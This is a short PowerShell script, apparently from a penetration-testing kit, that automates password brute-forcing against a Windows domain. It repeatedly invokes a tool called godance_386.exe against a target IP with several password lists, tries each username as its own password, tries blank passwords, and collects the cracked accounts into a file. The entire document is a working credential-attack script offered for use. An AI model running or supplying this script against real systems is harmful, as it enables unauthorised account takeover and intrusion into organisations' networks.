<#

1) Set Variables

$global:target="192.168.80.50"
$global:domain = "SECURE.local"
$global:userlist = "users.txt"
#

2) run the script 

./brute_godance.ps1

#>


#$global:target="$args[0]"
function run-godance {
#$userlist =  "C:\Windows\Temp\dusers.txt"

# Custom Password List 
$passlist = "pass100.txt"

#
date 



#password
.\godance_386.exe -d $domain -u $userlist -w pass_password.txt -h $target
Get-Content .\godance_brute.txt | findstr "In hacker voice" | sort-object| Get-Unique > godance_brute_cracked.txt

# pass5.txt
.\godance_386.exe -d $domain -u $userlist -w pass5.txt -h $target
Get-Content .\godance_brute.txt | findstr "In hacker voice" | sort-object| Get-Unique > godance_brute_cracked.txt


# user = pass
ForEach ($user in Get-Content $userlist) {
echo $user | Out-File -Encoding ascii tempuser.txt
.\godance_386.exe -d $domain -u tempuser.txt -w tempuser.txt -h $target
del tempuser.txt
}  


# pass_blank.txt - blank pw
.\godance_386.exe -d $domain -u $userlist -w pass_blank.txt -h $target
Get-Content .\godance_brute.txt | findstr "In hacker voice" | sort-object| Get-Unique > godance_brute_cracked.txt



date
echo ""
echo ""
echo "################ FINISHED ################"
echo ""
Get-Content .\godance_brute_cracked.txt
}
# Run 


#if ($target) { 
run-godance | Tee godance_brute.txt
#} else {
#Write-Host "USEAGE: " 
#Write-Host "	./godance-brute.ps1 [IP ADDRESS]" 
#Write-Host "" 
#Write-Host "" 
#}



